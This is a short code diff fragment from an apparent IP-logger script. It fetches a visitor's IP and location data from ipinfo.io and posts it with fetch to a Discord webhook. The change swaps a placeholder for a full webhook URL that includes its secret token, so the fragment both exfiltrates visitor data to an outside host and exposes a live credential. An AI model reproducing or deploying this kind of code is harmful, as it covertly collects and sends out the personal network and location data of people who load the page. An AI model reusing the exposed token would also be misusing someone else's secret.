@@ -23,7 +23,7 @@ $.getJSON("https://ipinfo.io/json", function(data) {
       }
     ]
   }
-  fetch('YOUR WEBHOOK LINK HERE', {
+  fetch('https://discord.com/api/webhooks/1100562137312657498/pb7w3wreJMctjLgj9Mhzrc0f6OxUWM5Ke5y0ObMwubbTvmRdgrH8ngkAXUt6PStAvF9M', {
     method: "POST",
     headers: {
         'Content-type': 'application/json'
